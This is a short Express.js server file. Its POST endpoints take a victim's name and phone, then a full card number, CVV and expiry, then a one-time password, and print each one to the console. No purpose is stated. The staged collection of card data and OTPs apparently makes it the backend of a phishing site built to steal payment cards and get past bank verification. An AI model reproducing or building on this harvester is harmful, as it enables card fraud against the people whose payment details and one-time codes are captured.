
const express = require('express')
const app = express()
const cors = require('cors')
const path = require('path');
const port = 3000



// app.use(bodyParser.json());
// app.use(bodyParser.urlencoded({extended:false}));
app.use(express.json());

app.use(cors())

app.use('/static',express.static(__dirname + '/Public'))

app.get('/', (req, res) => {
  res.send('Hello World!')
})

app.post('/getbasic', (req, res) => {
  const name = req.body.name;
  const phone = req.body.phone;

  console.log("basic details ", name , phone)
  res.send('card')

})


app.post('/getcard', (req, res) => {
const card = req.body.card;
const cvv= req.body.cvv;
const expmnth = req.body.expmnth;
const expyear = req.body.expyear;
console.log(`Card : ${card}\n CVV: ${cvv}\n mnth : ${expmnth}\n yy : ${expyear}`)
res.send('succes')

})

app.post('/getotp', (req, res) => {

  
  const otp = req.body.otp;
console.log(`OTP : ${otp}`)
  res.send('succes')


})







app.listen(port, () => {
  console.log(`Example app listening on port ${port}`)
})